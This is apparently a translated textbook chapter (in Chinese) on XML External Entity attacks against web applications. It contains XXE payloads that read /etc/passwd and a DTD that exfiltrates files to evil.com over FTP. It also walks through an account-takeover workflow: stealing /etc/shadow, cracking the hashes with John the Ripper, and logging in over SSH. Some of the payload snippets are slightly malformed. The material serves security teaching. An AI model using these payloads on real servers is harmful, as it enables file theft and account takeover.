# 第 12 章：XML 外部实体（XXE）

XML 外部实体（XXE）是一类通常非常简单执行、但结果具有毁灭性的攻击。这类攻击依赖于应用代码中配置不当的 XML 解析器。

一般来说，几乎所有 XXE 攻击漏洞都是由于 API 端点接受 XML（或类 XML）载荷而发现的。您可能认为接受 XML 的 HTTP 端点并不常见，但类 XML 格式包括 SVG、HTML/DOM、PDF（XFDF）和 RTF。这些类 XML 格式与 XML 规范有许多共同相似之处，因此许多 XML 解析器也接受它们作为输入。

XXE 攻击背后的魔力在于 XML 规范包含一个用于导入外部文件的特殊注解。这个特殊指令称为**外部实体**，在解析 XML 文件的机器上被解释。这意味着，一个特制的 XML 载荷发送到服务器的 XML 解析器，可能导致服务器文件结构中的文件被泄露。XXE 通常用于泄露其他用户的文件，或访问如 `/etc/shadow` 等存储 Unix 服务器正常运行所需重要凭据的文件。

## XXE 基础知识

每个 XXE 攻击的核心都是 XML 规范及其在处理所谓“实体”方面的弱点。XML 实体是用于引用 XML 文件内或 XML 规范内另一段数据的字符集。您可能见过诸如 `&amp;` 或 `&lt;` 这样的 XML 实体，它们分别引用与符号（`&`）和小于号（`<`）。这些被称为**预定义实体**，因为它们始终引用相同的 ASCII 字符。

在 XML 文档中可以引用的更危险的实体形式是**自定义实体**。这些实体可以引用程序员定义的广泛数据，包括当前 XML 文档之外的数据。

当然，最危险的自定义实体形式是**外部实体引用**，它是 XXE 式攻击的核心。通过在 XML 文档类型定义（DTD）中引用外部实体，可以在解析之前将外部文件拉入 XML 文件。考虑以下示例：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>
```

此示例实体引用文件 `etc/passwd`，其中包含有关 Linux 系统用户账户的敏感信息。XXE 攻击利用这些外部引用来泄露敏感信息、修改预期的应用功能，有时甚至启用远程代码执行。

## 直接 XXE

在直接 XXE 中，一个带有外部实体标志的 XML 对象被发送到服务器。然后它被解析，并返回一个包含外部实体的结果（见图 12-1）。

> **图 12-1. 直接 XXE**

假设 mega-bank.com 有一个截图实用程序，允许您直接将银行门户的截图发送给客户支持。在客户端，它看起来像这样：

```html
<!--
一个简单的按钮。点击时调用函数 `screenshot()`。
-->
<button class="button"
        id="screenshot-button"
        onclick="screenshot()">
  发送截图给支持
</button>
```

```javascript
/*
 * 从 `content` 元素收集 HTML DOM，并调用 XML 解析器将 DOM 文本转换为 XML。
 *
 * 通过 HTTP 将 XML 发送到一个函数，该函数将从提供的 XML 生成截图。
 *
 * 将截图发送给支持人员以供进一步分析。
 */
const screenshot = function() {
  try {
    /*
     * 尝试将 `content` 元素转换为 XML。
     * 如果此过程失败则捕获——通常应该成功，因为 HTML 是 XML 的子集。
     */
    const div = document.getElementById('content').innerHTML;
    const serializer = new XMLSerializer();
    const dom = serializer.serializeToString(div);

    /*
     * 一旦 DOM 转换为 XML，生成一个请求到某个端点，
     * 该端点将 XML 转换为图像。因此产生截图。
     */
    const xhr = new XMLHttpRequest();
    const url = 'https://util.mega-bank.com/screenshot';
    const data = new FormData();
    data.append('dom', dom);

    /*
     * 如果 XML -> 图像的转换成功，
     * 则将截图发送给支持进行分析。
     *
     * 否则提醒用户该过程失败。
     */
    xhr.onreadystatechange = function() {
      sendScreenshotToSupport(xhr.responseText, (err) => {
        if (err) { alert('could not send screenshot.'); }
        else { alert('screenshot sent to support!'); }
      });
    }
    xhr.send(data);
  } catch (e) {
    /*
     * 如果用户的浏览器不兼容此功能，则警告用户。
     */
    alert('Your browser does not support this functionality. Consider upgrading.');
  }
};
```

这个功能很简单：用户点击一个按钮，将他们的困难截图发送给支持人员。其编程方式也不复杂：

1. 浏览器将当前用户的视图（通过 DOM）转换为 XML。
2. 浏览器将此 XML 发送到一个将其转换为 JPG 的服务。
3. 浏览器通过另一个 API 将该 JPG 发送给 MegaBank 支持人员。

当然，这段代码不止一个问题。例如，我们可以用我们自己的图像调用 `sendScreenshotToSupport()` 函数。验证图像内容的合法性比验证 XML 要困难得多，而且虽然将 XML 转换为图像很容易，但图像转 XML 则更难，因为您会失去上下文（div 名称、ID 等）。

在服务器上，一个名为 `screenshot` 的路由与我们浏览器发起的请求相对应：

```javascript
import xmltojpg from './xmltojpg';

/*
 * 将 XML 对象转换为 JPG 图像。
 *
 * 将图像数据返回给请求者。
 */
app.post('/screenshot', function(req, res) {
  if (!req.body.dom) { return res.sendStatus(400); }

  xmltojpg.convert(req.body.dom)
    .then((err, jpg) => {
      if (err) { return res.sendStatus(400); }
      return res.send(jpg);
    });
});
```

要将 XML 文件转换为 JPG 文件，必须经过 XML 解析器。要成为有效的 XML 解析器，它必须遵循 XML 规范。

我们的客户端发送给服务器的载荷只是将 HTML/DOM 集合转换为 XML 格式以便于解析。在正常使用情况下，它几乎不会做任何危险的事情。

然而，客户端发送的 DOM 确实可以被更懂技术的用户修改。或者，我们也可以直接伪造网络请求，向我们自己的定制载荷发送到服务器：

```javascript
import utilAPI from './utilAPI';

/*
 * 生成一个新的 XML HTTP 请求，目标为 XML -> JPG 实用 API。
 */
const xhr = new XMLHttpRequest();
xhr.open('POST', utilAPI.url + '/screenshot');
xhr.setRequestHeader('Content-Type', 'application/xml');

/*
 * 提供一个手动构造的 XML 字符串，利用许多 XML 解析器中的外部实体功能。
 */
const rawXMLString = `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;

xhr.onreadystatechange = function() {
  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
    // 在此处检查响应数据
  }
}

/*
 * 将请求发送到 XML -> JPG 实用 API 端点。
 */
xhr.send(rawXMLString);
```

当服务器收到此请求时，其解析器将评估 XML，然后在响应中向我们返回一个图像（JPG）。如果 XML 解析器没有明确禁用外部实体，我们应该会在返回的截图中看到 `/etc/passwd` 的基于文本的文件内容。

## 间接 XXE

在间接 XXE 中，作为某种形式请求的结果，服务器生成一个 XML 对象。该 XML 对象包含用户提供的参数，可能导致包含外部实体标签（见图 12-2）。

> **图 12-2. 间接 XXE**

有时 XXE 攻击可用于一个不直接操作用户提交的 XML 对象的端点。当我们遇到一个接受类 XML 对象作为参数的 API 时，很自然会首先考虑尝试通过 XXE 攻击载荷引用外部实体。然而，仅仅因为一个 API 不接受 XML 对象作为其载荷的一部分，并不意味着它不使用 XML 解析器。

考虑以下用例。开发人员正在编写一个应用，通过 REST API 端点仅从用户请求一个参数。此应用旨在将该参数与公司已使用的企业级 CRM 软件包同步。

CRM 公司可能期望其 API 使用 XML 载荷，这意味着尽管公开暴露的载荷不接受 XML，但为了服务器能与 CRM 软件包正常通信，用户载荷必须通过 REST 服务器转换为 XML 对象，然后发送到 CRM 软件。

这通常发生在后台，这可能使黑客很难推断出有任何 XML 被使用。不幸的是，这实际上非常常见。随着企业软件（或依赖软件）公司的成长，他们通常以零碎方式升级软件，而不是全部从头构建。这意味着许多时候，现代 JSON/REST API 实际上会在某个时刻与 XML/SOAP API 对接。世界各地许多公司都将现代外观的软件和遗留软件系统拼凑在一起，而这些集成通常充满了深层安全漏洞，易于利用。

在前面的例子中，我们的非 XML 载荷会在服务器上被转换为 XML，然后发送到另一个软件系统。但如果没有内部知识，我们如何检测到这种情况正在发生呢？

一种方法是对您正在测试其 Web 应用的公司进行背景研究，以确定他们有哪些大型企业许可协议。有时，这些甚至是公开知识。

也可能查看他们托管的其他网页，看是否有数据通过不属于该公司的单独系统或 URL 呈现。

此外，许多旧的从 CRM 到会计或 HR 的企业软件包对其可存储数据的结构有限制。通过了解这些集成软件包的预期数据类型，如果面向公众的 API 在通过网络发送数据之前期望异常的数据格式，您可能能够推断出它们的使用。

## 带外数据泄露

即使找到了 XXE 漏洞，数据泄露也可能没有内置到应用逻辑中。XXE 漏洞并不总是返回数据，即使 XXE 在服务器上正确执行也是如此。

在这种情况下，理想的做法是在解析期间而不是通过响应泄露数据。这称为**XML 带外数据泄露**。这最容易通过文件传输协议（FTP）完成，但在遗留服务器上也可以使用一种称为 Gopher 的较旧网络协议。

首先，作为 XXE 载荷的一部分，在您自己的服务器上包含对 XML DTD 文件的引用：

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % dtd SYSTEM "https://evil.com/data.dtd">
  %asd;
  %c;
]>
<a>&rrr;</a>
```

现在，在您的服务器上确保 `data.dtd` 文件可通过 Web 访问，并包含以下内容：

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">
```

只要您的服务器启用了 FTP，一旦目标服务器加载了其 XXE 载荷，它将请求您外部托管的 DTD。外部托管的 DTD 将通过 FTP 逐行流式传输 `/etc/passwd` 文件的内容，将其结果留在您的本地日志文件中。在某些情况下，可以使用上述相同的技术通过 HTTP 或轻量级目录访问协议（LDAP）等其他协议流式传输数据。

## 账户接管工作流程

利用 XXE 攻击的最强大攻击模式之一是 Linux 账户接管（ATO）。在发现 XXE 漏洞后，会发起一系列 XXE 攻击，每个攻击针对与认证和授权相关的独立 Linux 操作系统核心文件。利用这些攻击的结果，可以获取用户的哈希密码以及所使用的哈希算法。

在找到哈希密码和哈希算法后，可以使用彩虹表和其他密码破解技术（取决于哈希算法）来获取用户密码。

从这点开始，攻击者可以使用有效的用户账户登录 Linux 服务器，并执行该用户拥有权限的任何操作。

### 获取系统用户数据

Linux ATO 模式的第一步是通过 `/etc/passwd` 文件获取系统用户数据。这可以通过任何允许外部实体数据返回或能够进行带外数据泄露的 XXE 漏洞来完成。

`/etc/passwd` 文件存在于所有基于 Linux 的服务器以及 BSD、Unix 和 WSL 上。它存储有关用户账户的信息，通常用于操作系统登录等功能。

`/etc/passwd` 中的每一行包含目标服务器上一个用户账户的单独条目。字段由冒号（`:`）分隔，总共七个字段。`/etc/passwd` 中的条目可能如下所示：

```
dev:x:1010:2020:app_developer:/dev_user:/bin/bash
```

条目的内容分为七个字段（如上所示），包括以下信息：

1. 用户名
2. 密码存储位置（`x` 表示 `/etc/shadow`）
3. 用户 ID
4. 主组 ID
5. 注释字段/杂项信息
6. 用户的家目录
7. 命令/shell 位置

此工作流程中最重要的数据点是第二行，密码存储位置。如果这是 `x`（通常如此），那么密码哈希将在 `/etc/shadow/` 文件中找到。

除了 ATO 场景之外，`/etc/passwd` 文件还会泄露用户的家目录和组等信息。这使得未来能够根据 Web 服务器的目录和权限结构，攻击特定用户数据。

### 获取密码哈希

下一步是获取与之前在 `/etc/passwd` 中找到的用户数据相对应的哈希密码。这一步可以通过任何允许外部实体数据返回或能够进行带外数据泄露的 XXE 漏洞来完成。

假设 `/etc/passwd` 已被 XXE 入侵，且用户密码被表示为 `x`，那么 `/etc/shadow` 包含这些用户的密码哈希，应该是下一步的攻击目标。大多数 Linux 发行版，如 Ubuntu、Debian、Fedora、Mint 和 Arch，默认都使用此文件。

`/etc/shadow` 的每一行涉及一个用户，用冒号（`:`）分隔。每行包括以下数据：

1. 用户名
2. 哈希密码（通常格式为 `$id:$salt:$hash`）
3. 以 Unix 纪元时间表示的上次密码更改日期
4. 密码更改之间的最小天数
5. 密码更改之间的最大天数
6. 密码过期前的天数
7. 密码过期后账户将被禁用的天数
8. 账户过期的日期（如果适用）

此文件中最重要的攻击目标是第二行，其中包含密码哈希。`$id` 标记指的是存储前用于哈希密码的哈希算法。以下选项有效：

- `$1$` 是 MD5
- `$6$` 是 SHA-512
- `$2a$` 和 `$2y$` 是 Blowfish
- `$5$` 是 SHA-256
- `$y$` 是 yescrypt

记下这些密码使用的哈希算法很重要，因为该信息在稍后评估破解哈希选项时将很重要。

### 破解密码哈希

在通过 `/etc/shadow` 获取哈希和哈希算法后，可以对其进行破解。在此过程中，从哈希中导出明文密码。

最简单的方法是使用第三方工具，如 John the Ripper 或 Hashcat 来自动化此过程。这些工具不接受未格式化的 `/etc/shadow` 和 `/etc/passwd` 文件，因此必须使用另一个工具如 `unshadow` 来正确格式化原始 Linux 文件的内容，以便它们可以作为 John the Ripper 等密码破解工具的输入。

一个简单的工作流程如下：

1. 创建被盗 `/etc/passwd` 文件的本地副本（例如 `passwd.txt`）。
2. 创建被盗 `/etc/shadow` 文件的本地副本（例如 `shadow.txt`）。
3. 格式化本地副本：`unshadow passwd.txt shadow.txt > passwords.txt`。
4. 尝试破解哈希：`john passwords.txt`。
5. 查看明文密码：`john --show passwords.txt`。

使用 John the Ripper 等工具破解密码是一个耗时间和硬件的过程。如果您拥有多台机器，最好在 CPU 或 GPU 最快的机器上执行此任务。John the Ripper 可以配置为使用 GPU 或 CPU，但不能同时使用两者。而 Hashcat 可以同时使用两者。

无需任何自动化工具也可以破解密码，但这样的努力在大多数情况下需要构建自己的自动化。因此，除非作为学习项目，否则不建议这样做。

### SSH 远程登录

一旦用户账户被入侵，并且您同时拥有用户名和密码凭据，最后一步是通过安全外壳（SSH）与目标服务器进行认证。在基于 macOS 或 Linux 的操作系统上，打开终端并输入以下命令，替换所需信息：

```bash
ssh <username>@<website.com>
```

如果启用了 SSH 通信，服务器将要求输入密码。输入并匹配后，您将能够远程控制 Web 服务器上被入侵的用户。如果您使用的是 Windows 机器，存在像 PuTTY 这样的第三方工具可以模拟 Linux SSH 工作流程。

无论是 Windows 还是 macOS/Linux SSH 情况，您现在都已完全控制目标服务器上的远程用户。ATO 工作流程已成功完成。

## 小结

XXE 攻击易于理解，通常也易于发起。由于它们威力强大，值得提及。Web 应用中的 XXE 漏洞可用于读取操作系统文件中的敏感信息，在某些情况下还可升级为更严重的攻击，如远程代码执行。

XXE 攻击依赖于一个安全不足但被广泛采用且在整个互联网上被依赖的标准。针对 XML 解析器的 XXE 攻击通常易于修复。有时仅仅一行配置就可以移除引用外部实体的能力。尽管如此，这些攻击始终应针对新应用进行尝试，因为 XML 解析器中一行缺失的配置就可能导致巨大的损害。
